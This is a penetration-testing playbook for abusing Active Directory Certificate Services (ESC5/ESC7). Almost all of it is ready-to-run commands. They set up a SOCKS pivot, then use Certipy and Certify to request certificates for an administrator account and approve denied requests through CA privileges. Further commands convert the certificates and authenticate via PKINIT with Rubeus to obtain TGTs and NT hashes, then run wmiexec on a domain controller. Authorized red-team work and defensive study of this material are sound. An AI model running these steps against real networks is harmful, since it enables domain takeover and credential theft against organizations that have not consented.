# ESC5—PKI Object Access Control (Vulnerable PKI Object ACL)

## Theory

> [!Overview] Title
> ESC5 covers privilege escalation paths where access over **PKI-related Active Directory objects** (not just templates or the CA service itself) allows an attacker to compromise ADCS and, by extension, the domain. If an attacker gains **Local Administrator** on the CA server or sufficient rights over PKI configuration objects (e.g., in `CN=Public Key Services,CN=Services,CN=Configuration,<FOREST_DN>`), they can often gain **ManageCA/ManageCertificates** privileges or manipulate PKI components (e.g., ESC4/ESC7 style abuses). This can enable issuing a certificate for a high-privileged principal (e.g., `<DOMAIN>\<ADMIN_USER>`) and authenticating as that account.

## Requirements

* **Control over PKI-related AD objects**, including (but not limited to):

  * **CA server AD computer object** (potential S4U2Self/S4U2Proxy abuse).
  * **CA server RPC/DCOM service** access.
  * **Any descendant object** under `CN=Public Key Services,CN=Services,CN=Configuration,<FOREST_DN>` (e.g., Certificate Templates, Certification Authorities, NTAuthCertificates, Enrollment Services containers).
* **Local Administrator** on the **CA server** (grants effective ManageCA/ManageCertificates; enables ESC4/ESC7-style attacks).
* **Ability to reach the CA/DC** over the network (RPC/SMB/LDAP/Kerberos).
* Tooling: `certipy`, `Certify.exe`, `Rubeus`, `Impacket`.

### Placeholders

`<DOMAIN>` `<FOREST_DN>` `<DC_IP>` `<ADCS_IP>` `<ADCS_HOST_FQDN>` `<CA_NAME>` `<TEMPLATE_NAME>` `<USER>` `<PASS>` `<ADMIN_USER>` `<CONTROLLED_USER>` `<CONTROLLED_MACHINE>` `<CONTROLLED_MACHINE_FQDN>` `<REQUEST_ID>` `<PFX_FILE>` `<KRB5CC_FILE>` `<ATTACK_BOX_USER>` `<ATTACK_BOX_PASS>` `<PROXY_SOCKS_ADDR>` `<PROXY_SOCKS_PORT>` `<DNS_IP>` `<RDP_USER>` `<RDP_PASS>`

---

## Linux

### (Optional) SOCKS Proxy via SSH

```bash
sshpass -p '<ATTACK_BOX_PASS>' ssh -N -f -D <PROXY_SOCKS_ADDR>:<PROXY_SOCKS_PORT> <ATTACK_BOX_USER>@<ATTACK_BOX_IP>
# If sshpass not installed, omit `sshpass -p ...` and enter the password interactively
# set <PROXY_SOCKS_ADDR> to localhost
# set <PROXY_SOCKS_PORT> to 9050
```

#### Proxychains4 Config (example)

```bash
# /etc/proxychains.conf
#proxy_dns            # comment this out to avoid DNS leakage if required
[ProxyList]
socks4  <PROXY_SOCKS_ADDR> <PROXY_SOCKS_PORT>
```

### Quick Admin Check with NetExec (over proxy)

```bash
proxychains4 -q netexec smb <DC_IP>-<ADCS_IP> -u <USER> -p '<PASS>'
# Look for (Pwn3d!) on <ADCS_HOST_FQDN>
```

### Enumerate ADCS with Certipy (over proxy)

```bash
proxychains4 -q certipy find \
  -u '<USER>' -p '<PASS>' \
  -dc-ip <DC_IP> -stdout \
  -ns <DNS_IP> -dns-tcp
# Review CA permissions and templates; certipy may not always show Local Admin => ManageCA/ManageCertificates
```

> If you are **Local Admin** on the CA server, you can typically abuse **ESC4/ESC7** patterns to issue certs for privileged principals even if template enrollment is restricted.

### Issue a High-Privilege Cert via ESC7 Pattern (SubCA template example)

> Use when you have Local Admin on the CA server and a template like **SubCA** is present.

#### 1 Submit request (expect policy denial but obtain a Request ID)

```bash
proxychains4 -q certipy req \
  -u '<USER>' -p '<PASS>' \
  -dc-ip <DC_IP> -ns <DNS_IP> -dns-tcp \
  -target-ip <ADCS_IP> -ca '<CA_NAME>' \
  -template '<TEMPLATE_NAME>' -upn '<ADMIN_UPN>'
# Expect denial and a Request ID; save private key if prompted
```

#### 2 Approve the pending request (requires ManageCertificates / Local Admin on CA)

```bash
proxychains4 -q certipy ca \
  -u '<USER>' -p '<PASS>' \
  -dc-ip <DC_IP> -ns <DNS_IP> -dns-tcp \
  -target-ip <ADCS_IP> -ca '<CA_NAME>' \
  -issue-request <REQUEST_ID>
```

#### 3 Retrieve the issued certificate

```bash
proxychains4 -q certipy req \
  -u '<USER>' -p '<PASS>' \
  -dc-ip <DC_IP> -ns <DNS_IP> -dns-tcp \
  -target-ip <ADCS_IP> -ca '<CA_NAME>' \
  -retrieve <REQUEST_ID>
# => Saves <ADMIN_USER>.pfx (or use -out '<PFX_FILE>')
```

### Authenticate with the Issued Certificate

```bash
proxychains4 -q certipy auth -pfx '<PFX_FILE>' -username '<ADMIN_USER>' -domain '<DOMAIN>' -dc-ip <DC_IP> -ns <DNS_IP> -dns-tcp
# Produces <KRB5CC_FILE> and may print NT hash
```

### Use the TGT (Kerberos) over Proxychains

> Ensure host resolution for DC/hosts (e.g., `/etc/hosts` or DNS).

```bash
# /etc/hosts (example)
<DC_IP> <DC_HOSTNAME> <DC_HOSTNAME>.<DOMAIN> <DOMAIN> <DOMAIN_SHORT>
```

```bash
KRB5CCNAME=<KRB5CC_FILE> proxychains4 -q wmiexec.py -k -no-pass <DC_HOSTNAME>.<DOMAIN> -dc-ip <DC_IP>
```

---

## Windows

### Enumerate PKI with Certify

```powershell
# In an elevated PowerShell on the CA server or a host that can reach it
.\Certify.exe find /vulnerable
# Check that BUILTIN\Administrators (Local Admins) have ManageCA/ManageCertificates on <CA_NAME>
```

> If Local Admins have **ManageCA/ManageCertificates**, you can proceed with an **ESC7-style** flow: submit a request for `<ADMIN_USER>`, approve it in the CA console, download, convert to PFX, then use with Rubeus.

### Request a Certificate (e.g., SubCA template)

```powershell
.\Certify.exe request /ca:<ADCS_HOST_FQDN>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:<ADMIN_USER>
# Note the Request ID (e.g., <REQUEST_ID>) if policy denies immediately
# Note the private key
```

### Approve the Request in the CA Console

```powershell
# Run the CA console
certsrv.msc
# Locate Request ID <REQUEST_ID> under 'Failed Requests' or 'Pending Requests'
# Right-click -> All Tasks -> Issue
```

### Download the Issued Certificate

```powershell
.\Certify.exe download /ca:<ADCS_HOST_FQDN>\<CA_NAME> /id:<REQUEST_ID>
# Combine RSA PRIVATE KEY and CERTIFICATE into a single PEM (e.g., approved.pem)
```

### Convert PEM to PFX

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 \
  -in approved.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out approved.pfx
```

### Request TGT and NT Hash with Rubeus (PKINIT)

```powershell
.\Rubeus.exe asktgt /user:<ADMIN_USER> /certificate:approved.pfx /getcredentials
# Outputs base64 TGT; may print NTLM hash
```

---

## Notes & Troubleshooting

* If you see `CERTSRV_E_TEMPLATE_DENIED`, capturing the **Request ID** still allows you to **issue** the request via CA privileges.
* If `certipy auth` errors with `KDC_ERR_PADATA_TYPE_NOSUPP`, retry; if persistent, verify CA/KDC settings or domain reachability.
* Ensure DNS/host mapping for Kerberos SPNs when tunneling through proxies.
* When only object ACLs are controlled (not Local Admin), investigate direct abuses on objects inside `CN=Public Key Services,...` (e.g., template ACLs, Enrollment Services objects) or pivot to ESC4/ESC7 depending on what rights are present.
